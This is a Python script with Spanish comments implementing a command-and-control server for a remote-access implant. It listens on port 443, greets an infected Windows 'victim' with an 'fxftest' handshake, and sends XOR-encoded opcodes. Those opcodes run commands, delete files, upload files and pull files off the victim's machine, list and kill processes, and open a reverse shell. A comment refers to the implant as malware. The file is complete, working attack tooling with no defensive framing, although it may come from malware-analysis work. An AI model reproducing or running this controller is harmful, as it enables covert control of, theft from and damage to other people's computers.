import socket
import struct
import sys
import time
import os
import threading

# ================= CONFIGURACIÓN =================
HOST = '0.0.0.0'
PORT = 443 
XOR_KEY = 0x55
# =================================================

def xor_crypt(data, key=0x55):
    """Aplica XOR 0x55 a un buffer"""
    crypted = bytearray()
    for byte in data:
        crypted.append(byte ^ key)
    return crypted

def recv_timeout(conn, size, timeout=2):
    """Recibe datos con timeout para evitar bloqueos"""
    conn.settimeout(timeout)
    try:
        data = conn.recv(size)
        return data
    except socket.timeout:
        return None
    finally:
        conn.settimeout(None)

def recv_exact(conn, size):
    """Recibe cantidad exacta de bytes"""
    buf = b''
    while size > 0:
        chunk = conn.recv(min(size, 4096))
        if not chunk: return buf
        buf += chunk
        size -= len(chunk)
    return buf

# --- HANDLERS ---

def handle_opcode_1(conn):
    print("\n[*] Enviando Opcode 1...")
    pkt = struct.pack('<I', 1) + (b'\x00' * 256)
    conn.sendall(pkt)
    
    data = recv_timeout(conn, 256)
    if data:
        decrypted = xor_crypt(data)
        text = decrypted.replace(b'\x00', b'').decode('latin-1', 'ignore')
        print(f"[+] UNIDADES:\n    {text}")
    else:
        print("[-] Sin respuesta.")

def handle_opcode_2(conn):
    path = input("\n[?] Ruta: ") or "C:\\*"
    path_bytes = path.encode('latin-1')
    payload = bytearray(xor_crypt(path_bytes))
    while len(payload) < 256: payload.append(0x55)
    
    conn.sendall(struct.pack('<I', 2) + payload)
    
    status = recv_timeout(conn, 2)
    if not status or status[0] == 0x71: 
        print("[-] Error.")
        return

    print(f"[+] Listando {path}...")
    while True:
        frame = recv_timeout(conn, 516, timeout=3)
        if not frame or len(frame) < 516: break
        
        name_raw = xor_crypt(frame[:256])
        name = name_raw.replace(b'\x00', b'').decode('latin-1', 'ignore')
        print(f"    {name}")
        
        conn.send(b'\x00\x00')

def handle_opcode_3(conn):
    cmd = input("\n[?] WinExec: ")
    if not cmd: return
    
    cmd_bytes = cmd.encode('latin-1')
    payload = bytearray(xor_crypt(cmd_bytes))
    while len(payload) < 256: payload.append(0x55)
    
    conn.sendall(struct.pack('<I', 3) + payload)
    
    status = recv_timeout(conn, 2)
    if status:
        hex_status = status.hex()
        print(f"[+] Ejecutado (Status: {hex_status})")

def handle_opcode_4(conn):
    path = input("\n[?] Borrar: ")
    if not path: return
    
    path_bytes = path.encode('latin-1')
    payload = bytearray(xor_crypt(path_bytes))
    while len(payload) < 256: payload.append(0x55)
    
    conn.sendall(struct.pack('<I', 4) + payload)
    
    status = recv_timeout(conn, 2)
    if status and status[0] == 0x30: print("[+] Borrado.")
    else: print("[-] Fallo.")

def handle_opcode_5(conn):
    local = input("\n[?] Local: ")
    if not os.path.exists(local): return
    remote = input("[?] Remote: ")
    
    path_bytes = remote.encode('latin-1')
    path_enc = bytearray(xor_crypt(path_bytes))
    while len(path_enc) < 512: path_enc.append(0x55)
    
    conn.send(struct.pack('<I', 5))
    time.sleep(0.2)
    conn.sendall(path_enc + struct.pack('<I', os.path.getsize(local)))
    
    with open(local, 'rb') as f: conn.sendall(f.read())
    if recv_timeout(conn, 16): print("[+] Subido.")

def handle_opcode_6(conn):
    remote = input("\n[?] Download: ")
    if not remote: return
    
    path_bytes = remote.encode('latin-1')
    payload = bytearray(xor_crypt(path_bytes))
    while len(payload) < 256: payload.append(0x55)
    
    conn.sendall(struct.pack('<I', 6) + payload)
    
    header = recv_exact(conn, 516)
    if not header: return
    
    size = struct.unpack('<I', header[512:516])[0]
    data = recv_exact(conn, size)
    
    clean_path = remote.replace('\\', '/')
    local_name = f"dl_{os.path.basename(clean_path)}"
    
    with open(local_name, 'wb') as f: f.write(data)
    print(f"[+] Descargado: {local_name}")

def handle_opcode_7(conn):
    print("\n[*] Procesos...")
    conn.sendall(struct.pack('<I', 7) + (b'\x00' * 256))
    print(f"{'PID':<8} {'PROCESO'}")
    
    while True:
        frame = recv_timeout(conn, 264, timeout=3)
        if not frame or len(frame) < 264: break
        
        name_raw = xor_crypt(frame[:256])
        name = name_raw.replace(b'\x00', b'').decode('latin-1', 'ignore')
        
        if not name: break
        try: pid = struct.unpack('<I', frame[252:256])[0]
        except: pid = 0
        
        print(f"{pid:<8} {name[:40]}")
        conn.send(b'\x00\x00')

def handle_opcode_8(conn):
    pid = input("\n[?] PID a matar: ")
    if not pid: return
    
    pid_bytes = pid.encode('latin-1')
    payload = bytearray(xor_crypt(pid_bytes))
    while len(payload) < 256: payload.append(0x55)
    
    conn.sendall(struct.pack('<I', 8) + payload)
    if recv_timeout(conn, 2): print("[+] Comando enviado.")

def handle_opcode_9(conn):
    print("\n[+] SHELL ACTIVA (Escribe 'exit' para salir)")
    conn.sendall(struct.pack('<I', 9) + (b'\x00' * 256))

    state = {'running': True}

    def read_socket():
        while state['running']:
            try:
                data = conn.recv(4100)
                if not data: break
                
                decrypted = xor_crypt(data)
                
                safe_bytes = bytearray()
                for b in decrypted:
                    if (32 <= b <= 126) or b in [9, 10, 13] or b >= 128:
                        safe_bytes.append(b)
                
                sys.stdout.write(safe_bytes.decode('latin-1', errors='ignore'))
                sys.stdout.flush()
            except:
                break

    t = threading.Thread(target=read_socket)
    t.daemon = True
    t.start()

    try:
        while True:
            cmd = input() 
            if cmd.strip() == 'exit':
                state['running'] = False
                break
            conn.sendall(cmd.encode('latin-1') + b'\n')
            time.sleep(0.5)
    except KeyboardInterrupt:
        state['running'] = False
    
    print("\n[*] Shell cerrada.")

def handle_opcode_11(conn):
    """Opcode 11: Terminar Shell (Close Pipes)"""
    print("\n[*] Enviando orden de cierre de Shell (Cleanup)...")
    conn.sendall(struct.pack('<I', 11) + (b'\x00' * 256))
    
    # El malware responde con 'q' (0x71)
    status = recv_timeout(conn, 2)
    if status and status[0] == 0x71:
        print("[+] Shell terminada y recursos liberados en la víctima.")
    else:
        print("[-] No hubo confirmación de cierre.")

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((HOST, PORT))
        print(f"[*] Listener OK en puerto {PORT}")
    except Exception as e:
        print(f"[!] Error: {e}"); return

    server.listen(1)
    print("[*] Esperando víctima...")
    conn, addr = server.accept()
    print(f"\n[+] Victima: {addr[0]}")

    if b'fxftest' in conn.recv(1024):
        conn.sendall(b'fxftest\x00')
        conn.recv(512)
    else: return

    while True:
        print("\n" + "="*40)
        print("1. Listar Unidades")
        print("2. Listar Archivos")
        print("3. WinExec")
        print("4. Borrar Archivo")
        print("5. Subir Archivo")
        print("6. Descargar Archivo")
        print("7. Listar Procesos")
        print("8. Matar Proceso")
        print("9. REVERSE SHELL")
        print("11. Terminar Shell (Opcode 11)")
        print("0. Salir")
        print("="*40)
        
        try:
            op = input("Opción > ")
            if op == '1': handle_opcode_1(conn)
            elif op == '2': handle_opcode_2(conn)
            elif op == '3': handle_opcode_3(conn)
            elif op == '4': handle_opcode_4(conn)
            elif op == '5': handle_opcode_5(conn)
            elif op == '6': handle_opcode_6(conn)
            elif op == '7': handle_opcode_7(conn)
            elif op == '8': handle_opcode_8(conn)
            elif op == '9': handle_opcode_9(conn)
            elif op == '11': handle_opcode_11(conn)
            elif op == '0': break
        except KeyboardInterrupt: break
        except Exception: break

    conn.close()
    server.close()

if __name__ == "__main__":
    start_listener()
